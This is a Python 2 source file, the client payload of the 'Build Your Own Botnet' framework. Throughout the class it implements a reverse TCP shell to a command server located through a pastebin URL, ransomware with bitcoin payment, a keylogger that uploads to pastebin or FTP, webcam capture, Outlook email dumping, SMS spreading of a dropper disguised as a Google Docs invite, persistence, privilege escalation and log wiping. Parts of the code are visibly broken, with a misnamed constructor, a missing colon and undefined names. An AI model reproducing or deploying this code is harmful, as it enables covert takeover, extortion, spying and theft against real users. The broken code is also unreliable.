#!/usr/bin/python
"""
Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
from __future__ import print_function

# standard libarary
import os
import sys
import time
import json
import zlib
import uuid
import numpy
import Queue
import base64
import ctypes
import pickle
import struct
import socket
import random
import urllib
import urllib2
import marshal
import zipfile
import logging
import itertools
import functools
import threading
import cStringIO
import subprocess
import collections
import logging.handlers

# cryptography
import Crypto.Util
import Crypto.Hash.HMAC
import Crypto.Cipher.AES
import Crypto.Hash.SHA256
import Crypto.PublicKey.RSA
import Crypto.Cipher.PKCS1_OAEP

# Windows
if os.name is 'nt':
    import wmi
    import pyHook
    import _winreg
    import win32com
    import pythoncom

# byob
import util
import crypto


class PayloadError(Exception):
    pass


class Payload():
    """
    Payload (Build Your Own Botnet)
    """
    _debug   = bool()
    _abort   = bool()

    def _init__(self, config=None, debug=True):
        """
        create a Payload instance
        """
        self.jobs      = Queue.Queue()
        self.flags     = {'connection': threading.Event(), 'mode': threading.Event(), 'prompt': threading.Event()}
        self.workers   = collections.OrderedDict()
        self.session   = collections.OrderedDict()
        self.info      = collections.OrderedDict()
        self.commands  = self.commands()


    def commands(self):
        commands = {}
        for cmd in vars(Payload):
            if hasattr(vars(Payload)[cmd], 'command') and getattr(vars(Payload)[cmd], 'command'):
                try:
                    commands[cmd] = {
                        'method': getattr(self, cmd),
                        'platforms': getattr(Payload, cmd).platforms,
                        'usage': getattr(Payload, cmd).usage,
                        'description': getattr(Payload, cmd).func_doc.strip().rstrip()}
                except Exception as e:
                    Payload.debug("{} error: {}".format(self.commands.func_name, str(e)))
        return commands
    

    def send(self, **kwargs):
        try:
            if self.flags['connection'].wait(timeout=1.0):
                if kwargs.get('result'):
                    buff = kwargs.get('result')
                    kwargs.update({'result': buff[:48000]})
                data = self.aes_encrypt(json.dumps(kwargs), self.session['key'])
                self.session['socket'].send(struct.pack('L', len(data)) + data)
                if len(buff[48000:]):
                    kwargs.update({'result': buff[48000:]})
                    return self.send(**kwargs)
            else:
                util.debug("connection timed out")
        except Exception as e:
            util.debug('{} error: {}'.format(self.send.func_name, str(e)))


    def recv(self, sock=None):
        if not sock:
            sock = self.session['socket']
        header_size = struct.calcsize('L')
        header = sock.recv(header_size)
        msg_len = struct.unpack('L', header)[0]
        data = ''
        while len(data) < msg_len:
            try:
                data += sock.recv(1)
            except (socket.timeout, socket.error):
                break
        if data and bytes(data):
            try:
                text = self.aes_decrypt(data, self.session['key'])
                task = json.loads(text)
                return task
            except Exception as e2:
                util.debug('{} error: {}'.format(self.recv.func_name, str(e2)))


    def _connect_api(self, *args, **kwargs):
        ip   = socket.gethostbyname(socket.gethostname())
        port = kwargs.get('port') if ('port' in kwargs and str(kwargs.get('port')).isdigit()) else 1337
        try:
            if not kwargs.get('debug'):
                if 'config' in kwargs:
                    url, api = urllib.urlopen(kwargs.get('config')).read().splitlines()
                    req = urllib2.Request(url)
                    req.headers = {'API-Key': api}
                    res = urllib2.urlopen(req).read()
                    try:
                        ip  = json.loads(res)['main_ip']
                        if not util.ipv4(ip):
                            util.debug("{} returned invalid IPv4 address: '{}'".format(self.get_server_addr.func_name, str(ip)))
                    except Exception as e1:
                        util.debug("{} error: {}".format(self.addr.func_name, str(e1)))
                else:
                    util.debug("{} error: missing API resources for finding active server".format(self.addr.func_name))
        except Exception as e2:
            util.debug("{} error: {}".format(self.addr.func_name, str(e2)))
            return self.restart(self.addr.func_name)
        util.debug("Connecting to {}:{}...".format(ip, port))
        return ip, port


    def _connect_direct(self, **kwargs):
        try:
            host, port = self.addr(**kwargs)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
            sock.setblocking(True)
            self.flags['connection'].set()
            return sock
        except Exception as e:
            util.debug("{} error: {}".format(self.connect.func_name, str(e)))
            return self.restart(self.connect.func_name)


    @util.threaded
    def prompt(self, *args, **kwargs):
        self.flags['prompt'].set()
        while True:
            try:
                self.flags['prompt'].wait()
                self.send(**{'id': '0'*64, 'client': self.info['uid'], 'command': 'prompt', 'result': '[%d @ {}]>'.format(os.getcwd())})
                self.flags['prompt'].clear()
            except Exception as e:
                util.debug("{} error: {}".format(self.prompt.func_name, str(e)))
                self.flags['prompt'].clear()


    def session_id(self):
        try:
            if self.flags['connection'].wait(timeout=3.0):
                self.session['socket'].sendall(self.aes_encrypt(json.dumps(self.info), self.session['key']) + '\n')
                buf      = ""
                attempts = 1
                while '\n' not in buf:
                    try:
                        buf += self.session['socket'].recv(1024)
                    except (socket.error, socket.timeout):
                        if attempts <= 3:
                            util.debug('Attempt %d failed - no Session ID received from server\nRetrying...' % attempts)
                            attempts += 1
                            continue
                        else:
                            break
                if buf:
                    return self.aes_decrypt(buf.rstrip(), self.session['key']).strip().rstrip()
            else:
                util.debug("{} timed out".format(self.session_id.func_name))
        except Exception as e:
            util.debug("{} error: {}".format(self.session_id.func_name, str(e)))
        return self.restart(self.session_id.func_name)


    def session_key(self):
        try:
            if self.flags['connection'].wait(timeout=3.0):
                g  = 2
                p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
                a  = Crypto.Util.number.bytes_to_long(os.urandom(32))
                xA = pow(g, a, p)
                self.session['socket'].send(Crypto.Util.number.long_to_bytes(xA))
                xB = Crypto.Util.number.bytes_to_long(self.session['socket'].recv(256))
                x  = pow(xB, a, p)
                return Crypto.Hash.MD5.new(Crypto.Util.number.long_to_bytes(x)).hexdigest()
            else:
                util.debug("{} timed out".format(self.session_key.func_name))
        except Exception as e:
            util.debug("{} error: {}\nRestarting in 5 seconds...".format(self.session_key.func_name, str(e)))
        return self.restart(self.session_key.func_name)


    @util.threaded
    @util.config(flag=threading.Event())
    def task_manager(self):
        try:
            while True:
                if self.abort:
                    break
                else:
                    self.task_manager.flag.wait()
                    jobs = self.workers.items()
                    for task, worker in jobs:
                        if not worker.is_alive():
                            dead = self.workers.pop(task, None)
                            del dead
                    time.sleep(1)
        except Exception as e:
            util.debug('{} error: {}'.format('TaskManager', str(e)))

    def diffiehellman(connection):
        """
        Diffie-Hellman key exchange for secure shared secret key (even on monitored networks)
        """
        if isinstance(connection, socket.socket):
            try:
                g  = 2
                p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
                a  = Crypto.Util.number.bytes_to_long(os.urandom(32))
                xA = pow(g, a, p)
                connection.send(Crypto.Util.number.long_to_bytes(xA))
                xB = Crypto.Util.number.bytes_to_long(connection.recv(256))
                x  = pow(xB, a, p)
                return Crypto.Hash.MD5.new(Crypto.Util.number.long_to_bytes(x)).hexdigest()
            except Exception as e:
                util.debug("{} error: {}".format(diffiehellman.func_name, str(e)))
        else:
            util.debug("{} erorr: invalid input type - expected '{}', received '{}'".format(diffiehellman.func_name, socket.socket, type(connection)))

    def encrypt_aes(data, key):
        """
        Encrypt data with 256-bit key using AES cipher in authenticated OCB mode
        """
        try:
            cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB)
            ciphertext, tag = cipher.encrypt_and_digest(data)
            output = b''.join((cipher.nonce, tag, ciphertext))
            return base64.b64encode(output)
        except Exception as e:
            util.debug("{} error: {}".format(encrypt.func_name, str(e)))

    def decrypt_aes(data, key):
        """
        Decrypt data encrypted with 256-bit key using AES cipher in authenticated OCB mode
        """
        try:
            data = cStringIO.StringIO(base64.b64decode(data))
            nonce, tag, ciphertext = [ data.read(x) for x in (Crypto.Cipher.AES.block_size - 1, Crypto.Cipher.AES.block_size, -1) ]
            cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB, nonce)
            return cipher.decrypt_and_verify(ciphertext, tag)
        except Exception as e1:
            util.debug("{} error: {}".format(decrypt.func_name, str(e1)))
            try:
                return cipher.decrypt(ciphertext)
            except Exception as e2:
                return "{} error: {}".format(decrypt.func_name, str(e2))

    def encrypt_xor(data, key, block_size=8, key_size=16, num_rounds=32, padding='\x00'):
        """
        Encrypt data with 128-bit key using XOR cipher
        """
        data    = bytes(data) + (int(block_size) - len(bytes(data)) % int(block_size)) * bytes(padding)
        blocks  = [data[i * block_size:((i + 1) * block_size)] for i in range(len(data) // block_size)]
        vector  = os.urandom(8)
        result  = [vector]
        for block in blocks:
            block   = bytes().join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, block))
            v0, v1  = struct.unpack("!2L", block)
            k       = struct.unpack("!4L", key[:key_size])
            sum, delta, mask = 0L, 0x9e3779b9L, 0xffffffffL
            for round in range(num_rounds):
                v0  = (v0 + (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
                sum = (sum + delta) & mask
                v1  = (v1 + (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
            output  = vector = struct.pack("!2L", v0, v1)
            result.append(output)
        return base64.b64encode(bytes().join(result))

    def decrypt_xor(data, key, block_size=8, key_size=16, num_rounds=32, padding='\x00'):
        """
        Decrypt data encrypted with 128-bit key using XOR cipher
        """
        data    = base64.b64decode(data)
        blocks  = [data[i * block_size:((i + 1) * block_size)] for i in range(len(data) // block_size)]
        vector  = blocks[0]
        result  = []
        for block in blocks[1:]:
            v0, v1 = struct.unpack("!2L", block)
            k = struct.unpack("!4L", key[:key_size])
            delta, mask = 0x9e3779b9L, 0xffffffffL
            sum = (delta * num_rounds) & mask
            for round in range(num_rounds):
                v1 = (v1 - (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
                sum = (sum - delta) & mask
                v0 = (v0 - (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
            decode = struct.pack("!2L", v0, v1)
            output = str().join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, decode))
            vector = block
            result.append(output)
        return str().join(result).rstrip(padding)

    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='cd <path>')
    def cd(self, path='.'):
        """
        change current working directory - args: pathname
        """
        try:
            if os.path.isdir(path):
                return os.chdir(path)
            else:
                return os.chdir('.')
        except Exception as e:
            util.debug("{} error: {}".format(self.cd.func_name, str(e)))


    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='ls <path>')
    def ls(self, path='.'):
        """
        list directory contents
        """
        try:
            output = []
            if os.path.isdir(path):
                for line in os.listdir(path):
                    if len('\n'.join(output + [line])) < 2048:
                        output.append(line)
                    else:
                        break
                return '\n'.join(output)
            else:
                return "Error: path not found"
        except Exception as e2:
            util.debug("{} error: {}".format(self.ls.func_name, str(e2)))


    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='pwd')
    def pwd(self):
        """
        show name of present working directory
        """
        try:
            return os.getcwd()
        except Exception as e:
            util.debug("{} error: {}".format(self.pwd.func_name, str(e)))


    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='cat <path>')
    def cat(self, path):
        """
        display file contents
        """
        try:
            output = []
            if not os.path.isfile(path):
                return "Error: file not found"
            for line in open(path, 'rb').readlines():
                try:
                    line = line.rstrip()
                    if len(line) and not line.isspace():
                        if len('\n'.join(output + [line])) < 48000:
                            output.append(line)
                        else:
                            break
                except Exception as e1:
                    util.debug("{} error: {}".format(self.cat.func_name, str(e1)))
            return '\n'.join(output)
        except Exception as e2:
            util.debug("{} error: {}".format(self.cat.func_name, str(e2))  )


    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='set <cmd> [key=value]')
    def set(self, arg):
        """
        set client options
        """
        try:
            target, _, opt = arg.partition(' ')
            option, _, val = opt.partition('=')
            if val.isdigit() and int(val) in (0,1):
                val = bool(int(val))
            elif val.isdigit():
                val = int(val)
            elif val.lower() in ('true', 'on', 'enable'):
                val = True
            elif val.lower() in ('false', 'off', 'disable'):
                val = False
            elif ',' in val:
                val = val.split(',')
            if hasattr(self, target):
                try:
                    setattr(getattr(self, target), option, val)
                except:
                    try:
                        getattr(self, target).func_dict[option] = val
                    except: pass
                try:
                    return json.dumps(vars(getattr(self, target)))
                except:
                    return bytes(vars(getattr(self, target)))
            else:
                return "Target attribute '{}' not found".format(str(target))
        except Exception as e:
            util.debug("{} error: {}".format(self.set.func_name, str(e)))


    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='sms <send/read> [args]')
    def phone(self, args):
        """
        text all host contacts with links to a dropper disguised as Google Docs invite
        """
        if 'phone' in globals():
            mode, _, args = str(args).partition(' ')
            if 'send' in mode:
                phone_number, _, message = args.partition(' ')
                return sms.text_message(phone_number, message)
            else:
                return 'usage: <send/read> [args]\n  arguments:\n\tphone    :   phone number with country code - no spaces (ex. 18001112222)\n\tmessage :   text message to send surrounded by quotes (ex. "example text message")'
        else:
            return "Error: missing module 'sms'"

    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='eval <code>')
    def eval(self, code):
        """
        execute Python code in current context
        """
        try:
            return eval(code)
        except Exception as e:
            util.debug("{} error: {}".format(self.eval.func_name, str(e)))


    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='wget <url>')
    def wget(self, url, filename=None):
        """
        download file from url as temporary file and return filepath
        """
        if url.startswith('http'):
            try:
                path, _ = urllib.urlretrieve(url, filename) if filename else urllib.urlretrieve(url)
                return path
            except Exception as e:
                util.debug("{} error: {}".format(self.wget.func_name, str(e)))
        else:
            return "Invalid target URL - must begin with 'http'"


    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='restart [output]')
    def restart(self, output='connection'):
        """
        restart the client payload
        """
        try:
            util.debug("{} failed - restarting in 3 seconds...".format(output))
            self.kill()
            time.sleep(3)
            os.execl(sys.executable, 'python', sys.argv[0], *sys.argv[1:])
        except Exception as e:
            util.debug("{} error: {}".format(self.restart.func_name, str(e)))
            

    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='kill')
    def kill(self, debug=False):
        """
        shutdown the current connection and reset session
        """
        try:
            self.flags['connection'].clear()
            self.flags['prompt'].clear()
            self.session['socket'].shutdown(socket.SHUT_RDWR)
            self.session['socket'].close()
            self.session['socket'] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.session['id'] = str()
            self.session['key'] = str()
            self.session['public_key'] = str()
            workers = self.workers.keys()
            for worker in workers:
                try:
                    self.stop(worker)
                except Exception as e2:
                    util.debug("{} error: {}".format(self.kill.func_name, str(e2)))
        except Exception as e:
            util.debug("{} error: {}".format(self.kill.func_name, str(e)))


    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='help')
    def help(self, cmd=None):
        """
        list commands with usage information
        """
        if not cmd:
            try:
                return json.dumps({self.commands[c]['usage']: self.commands[c]['description'] for c in self.commands})
            except Exception as e1:
                util.debug("{} error: {}".format(self.help.func_name, str(e1)))
        elif hasattr(self, str(cmd)) and 'prompt' not in cmd:
            try:
                return json.dumps({self.commands[cmd]['usage']: self.commands[cmd]['description']})
            except Exception as e2:
                util.debug("{} error: {}".format(self.help.func_name, str(e2)))
        else:
            return "Invalid command - '{}' not found".format(cmd)


    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='show <value>')
    def show(self, attribute):
        """
        show value of an attribute
        """
        try:
            attribute = str(attribute)
            if 'jobs' in attribute:
                return json.dumps({a: util.status(self.workers[a].name) for a in self.workers if self.workers[a].is_alive()})
            elif 'privileges' in attribute:
                return json.dumps({'username': self.info.get('username'),  'administrator': 'true' if bool(os.getuid() == 0 if os.name is 'posix' else ctypes.windll.shell32.IsUserAnAdmin()) else 'false'})
            elif 'info' in attribute:
                return json.dumps(self.info)
            elif hasattr(self, attribute):
                try:
                    return json.dumps(getattr(self, attribute))
                except:
                    try:
                        return json.dumps(vars(getattr(self, attribute)))
                    except: pass
            elif hasattr(self, str('_%s' % attribute)):
                try:
                    return json.dumps(getattr(self, str('_%s' % attribute)))
                except:
                    try:
                        return json.dumps(vars(getattr(self, str('_%s' % attribute))))
                    except: pass
            else:
                return self.show.usage
        except Exception as e:
            util.debug("'{}' error: {}".format(self.workers.func_name, str(e)))


    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='stop <job>')
    def stop(self, target):
        """
        stop a running job
        """
        try:
            if target in self.workers:
                _ = self.workers.pop(target, None)
                del _
                return "Job '{}' was stopped.".format(target)
            else:
                return "Job '{}' not found".format(target)
        except Exception as e:
            util.debug("{} error: {}".format(self.stop.func_name, str(e)))


    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='portscan <target>')
    def portscan(self, args):
        """
        portscan the network to find online hosts and open ports
        """
        if 'portscan' not in globals():
            return "Error: missing module 'portscan'"
        try:
            args = str(args).split()
            host = [i for i in args if util.ipv4(i)][0] if len([i for i in args if util.ipv4(i)]) else self.info.get('local')
            return self.portscan_network(host) if 'network' in args else self.portscan_host(host)
        except Exception as e:
            util.debug("{} error: {}".format(self.portscan.func_name, str(e)))


    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='unzip <file>')
    def unzip(self, path):
        """
        unzip a compressed archive/file
        """
        if os.path.isfile(path):
            try:
                _ = zipfile.ZipFile(path).extractall('.')
                return os.path.splitext(path)[0]
            except Exception as e:
                util.debug("{} error: {}".format(self.unzip.func_name, str(e)))
        else:
            return "File '{}' not found".format(path)


    @util.config(platforms=['win32','darwin'], command=True, usage='outlook <option> [mode]')
    def outlook(self, args=None):
        """
        access Outlook email without authenticating or opening the GUI
        """
        if 'outlook' not in globals():
            return "Error: missing module 'outlook'"
        if not args:
            try:
                if not outlook.installed()
                    return "Error: Outlook not installed on this host"
            except: pass
        else:
            try:
                mode, _, arg   = str(args).partition(' ')
                if hasattr(self, '_email_%s' % mode):
                    if 'dump' in mode or 'upload' in mode:
                        self.workers['outlook'] = threading.Thread(target=getattr(outlook, mode), kwargs={'n': arg}, name=time.time())
                        self.workers['outlook'].daemon = True
                        self.workers['outlook'].start()
                        return "Dumping emails from Outlook inbox"
                    elif hasattr(outlook, mode):
                        return getattr(outlook, mode)()
                    else:
                        return "Error: invalid mode '%s'" % mode
                else:
                    return "usage: email <dump/search> [ftp/pastebin]"
            except Exception as e:
                util.debug("{} error: {}".format(self.email.func_name, str(e)))


    @util.config(platforms=['win32','linux2','darwin'], registry_key=r"Software\AngryEggplant", command=True, usage='ransom <mode> [path]')
    def ransom(self, args):
        """
        encrypt personal files and ransom them
        """
        if 'ransom' not in globals():
            return "Error: missing module 'ransom'"
        if not args:
            return "\tusage: ransom <encrypt/decrypt> [path]"
        cmd, _, action = str(args).partition(' ')
        if 'payment' in cmd:
            try:
                payment = self.resource('api bitcoin ransom_payment')
                return ransom.payment(payment)
            except:
                return "{} error: {}".format(Payload._ransom_payment.func_name, "bitcoin wallet required for ransom payment")
        elif 'decrypt' in cmd:
            return ransom.decrypt_threader(action)
        elif 'encrypt' in cmd:
            reg_key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, registry_key)
            return ransom.encrypt_threader(action)
        else:
            return "\tusage: ransom <mode> [path]\n\tmodes: encrypt, decrypt, payment"


    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='upload <mode> <path>')
    def upload(self, args):
        """
        upload file to imgur, pastebin, or ftp server - args: (ftp, imgur, pastebin) file
        """
        try:
            mode, _, source = str(args).partition(' ')
            target  = '_upload_{}'.format(mode)
            if not source or not hasattr(self, target):
                return self.upload.usage
            return getattr(self, target)(source)
        except Exception as e:
            util.debug("{} error: {}".format(self.upload.func_name, str(e)))


    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='webcam <mode> [options]')
    def webcam(self, args=None):
        """
        stream the webcam or capture image/video - args: (image, stream, video)
        """
        try:
            if not args:
                result = self.webcam.usage
            elif 'webcam' not in globals():
                return "Error: missing module 'webcam'"
            else:
                args = str(args).split()
                if 'stream' in args:
                    if len(args) != 2:
                        result = "Error - stream mode requires argument: 'port'"
                    elif not str(args[1]).isdigit():
                        result = "Error - port must be integer between 1 - 65355"
                    else:
                        result = webcam.stream(port=args[1])
                else:
                    result = webcam.image(*args) if 'video' not in args else webcam.video(*args)
        except Exception as e:
            result = "{} error: {}".format(self.webcam.func_name, str(e))
        return result


    @util.config(platforms=['win32'], command=True, usage='escalate')
    def escalate(self):
        """
        attempt to escalate privileges
        """
        try:
            if util.administrator():
                return "Current user '{}' has administrator privileges".format(self.info.get('username'))
            if os.name is 'nt':
                win32com.shell.shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(self.clients.get('result')))
            else:
                return "Privilege escalation not yet available on '{}'".format(sys.platform)
        except Exception as e:
            util.debug("{} error: {}".format(self.escalate.func_name, str(e)))


    @util.config(platforms=['win32','linux2','darwin'], process_list={}, command=True, usage='execute <path> [args]')
    def execute(self, args):
        """
        run an executable program in a hidden process
        """
        path, args = [i.strip() for i in args.split('"') if i if not i.isspace()] if args.count('"') == 2 else [i for i in args.partition(' ') if i if not i.isspace()]
        args = [path] + args.split()
        if os.path.isfile(path):
            name = os.path.splitext(os.path.basename(path))[0]
            try:
                info = subprocess.STARTUPINFO()
                info.dwFlags = subprocess.STARTF_USESHOWWINDOW ,  subprocess.CREATE_NEW_ps_GROUP
                info.wShowWindow = subprocess.SW_HIDE
                self.execute.process_list[name] = subprocess.Popen(args, startupinfo=info)
                return "Running '{}' in a hidden process".format(path)
            except Exception as e:
                try:
                    self.execute.process_list[name] = subprocess.Popen(args, 0, None, None, subprocess.PIPE, subprocess.PIPE)
                    return "Running '{}' in a new process".format(name)
                except Exception as e:
                    util.debug("{} error: {}".format(self.execute.func_name, str(e)))
        else:
            return "File '{}' not found".format(str(path))


    @util.config(platforms=['win32','linux2','darwin'], max_bytes=4000, buffer=cStringIO.StringIO(), window=None, command=True, usage='keylogger start/stop/dump/status')
    def keylogger(self, *args, **kwargs):
        """
        log user keystrokes - (auto, run, stop, dump, status)
        """
        if 'keylogger' not in globals():
            return "Error: missing module 'keylogger'"
        mode = args[0] if args else None
        if not mode:
            if 'keylogger' not in self.workers:
                return keylogger.usage
            else:
                return keylogger.status()
        else:
            if 'run' in mode:
                if 'keylogger' not in self.workers:
                    keylogger.workers['keylogger'] = keylogger.run()
                    return keylogger.status()
                else:
                    return keylogger.status()
            elif 'stop' in mode:
                try:
                    self.stop('keylogger')
                except: pass
                try:
                    self.stop('keylogger')
                except: pass
                return keylogger.status()
            elif 'auto' in mode:
                self.workers['keylogger'] = keylogger.auto()
                return keylogger.status()
            elif 'dump' in mode:
                result = util.pastebin(keylogger._buffer) if not 'ftp' in mode else util.ftp(keylogger._buffer)
                keylogger.buffer.reset()
                return result
            elif 'status' in mode:
                return keylogger.status()
            else:
                return keylogger.usage + '\n\targs: start, stop, dump'
            

    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='persistence add/remove [method]')
    def persistence(self, args=None):
        """
        persistence methods - all, registry_key, scheduled_task, launch_agent, crontab_job, startup_file, hidden_file
        """
        try:
            if not 'persistence' in globals():
                return "Error: missing module 'persistence'"
            elif not args:
                return self.persistence.usage
            else:
                cmd, _, action = str(args).partition(' ')
                methods = [m for m in persistence.methods if sys.platform in persistence.methods[m]['platforms']]
                if cmd not in ('add','remove'):
                    return self.persistence.usage + str('\nmethods: %s' % ', '.join([str(m) for m in persistence.methods if sys.platform in getattr(Payload, '_persistence_add_%s' % m).platforms]))
                for method in methods:
                    if method == 'all' or action == method:
                        persistence.methods[method]['established'], persistence.methods[method]['result'] = getattr(self, '_'.join(cmd, method))()
                return json.dumps({m: persistence.methods[m]['result'] for m in methods})
        except Exception as e:
            util.debug("{} error: {}".format(self.persistence.func_name, str(e)))
        return str(self.persistence.usage + '\nmethods: %s' % ', '.join([m for m in persistence.methods if sys.platform in getattr(Payload, '_persistence_add_%s' % m).platforms]))


    @util.config(platforms=['linux2','darwin'], capture=[], command=True, usage='packetsniffer mode=[str] time=[int]')
    def packetsniffer(self, args):
        """
        capture traffic on local network
        """
        try:
            if 'packetsniffer' not in globals():
                return "Error: missing module 'packetsniffer'"
            mode   = None
            length = None
            cmd, _, action = str(args).partition(' ')
            for arg in action.split():
                if arg.isdigit():
                    length = int(arg)
                elif arg in ('ftp','pastebin'):
                    mode   = arg
            self.workers[self.packetsniffer.func_name] = packetsniffer(mode, seconds=length)
            return 'Capturing network traffic for {} seconds'.format(duration)
        except Exception as e:
            return "{} error: {}".format(self.packetsniffer.func_name, str(e))


    @util.config(platforms=['win32'], buffer=cStringIO.StringIO(), max_bytes=1024, command=True, usage='ps <mode> [args]')
    def ps(self, args=None):
        """
        process utilities - mode: block, list, monitor, kill, search
        """
        try:
            if 'process' not in globals():
                return "Error: missing module 'process'"
            elif not args:
                return self.ps.usage
            else:
                cmd, _, action = str(args).partition(' ')
                if hasattr(process, cmd):
                    return getattr(process, cmd)(action) if action else getattr(process, cmd)()
                else:
                    return "usage: {}\n\tmode: block, list, search, kill, monitor\n\targs: name".format(self.ps.usage)
        except Exception as e:
            return "{} error: {}".format(self.ps.func_name, str(e))


    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='abort')
    def abort(self):
        """
        self-destruct and leave no trace on the disk
        """
        self.abort = True
        try:
            if os.name is 'nt':
                util.clear_system_logs()
            if 'persistence' in globals():
                for method in persistence.methods:
                    if persistence.methods[method].get('established'):
                        try:
                            remove = getattr(self, '_persistence_remove_{}'.format(method))()
                        except Exception as e2:
                            util.debug("{} error: {}".format(method, str(e2)))
            if not self.debug:
                util.delete(sys.argv[0])
        finally:
            shutdown = threading.Thread(target=self.get_shutdown)
            taskkill = threading.Thread(target=self.ps, args=('kill python',))
            shutdown.start()
            taskkill.start()
            sys.exit()


    @util.threaded
    def reverse_tcp_shell(self):
        """
        send encrypted shell back to server via outgoing TCP connection
        """
        try:
            self.workers[self.prompt.func_name] = self.prompt()
            while True:
                if self.flags['connection'].wait(timeout=1.0):
                    if not self.flags['prompt'].is_set():
                        task = self.recv()
                        if isinstance(task, dict):
                            cmd, _, action = [i.encode() for i in task['command'].partition(' ')]
                            try:
                                result  = bytes(getattr(self, cmd)(action) if action else getattr(self, cmd)()) if cmd in sorted([attr for attr in vars(Payload) if not attr.startswith('_')]) else bytes().join(subprocess.Popen(cmd, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                            except Exception as e1:
                                result  = "{} error: {}".format(self.reverse_tcp_shell.func_name, str(e1))
                            task.update({'result': result})
                            self.send(**task)
                            if cmd and cmd in self.flags['tasks'] and 'PRIVATE KEY' not in task['command']:
                                self.task_save(task, result)
                        self.flags['prompt'].set()
                else:
                    util.debug("Connection timed out")
                    break
        except Exception as e2:
            util.debug("{} error: {}".format(self.reverse_tcp_shell.func_name, str(e2)))
        return self.restart(self.reverse_tcp_shell.func_name)


    def connect(self, **kwargs):
        """
        connect to server and start new session
        """
        try:
            self.session['socket'] = self._connect_api(**kwargs) if len(kwargs) else self._connect_direct()
            self.session['key']    = self.session_key()
            self.session['id']     = self.session_id()
            return True
        except Exception as e:
            util.debug("{} error: {}".format(self.connect.func_name, str(e)))
        return False


    def run(self, **kwargs):
        """
        run client startup routine
        """
        try:
            if self.connect(**kwargs):
                self.workers[self.task_manager.func_name]     = self.task_manager()
                self.workers[self.reverse_tcp_shell.func_name] = self.reverse_tcp_shell()
                
            else:
                util.debug("connection timed out")
        except Exception as e:
            util.debug("{} error: {}".format(self.run.func_name, str(e)))
        return self.restart(self.run.func_name)



def main(*args, **kwargs):
    payload = Payload(**kwargs)
    payload.run(**kwargs)
    return payload

if __name__ == "__main__":
    payload = main(config='https://pastebin.com/raw/uYGhnVqp', debug=bool('debug' in sys.argv or '--debug' in sys.argv))
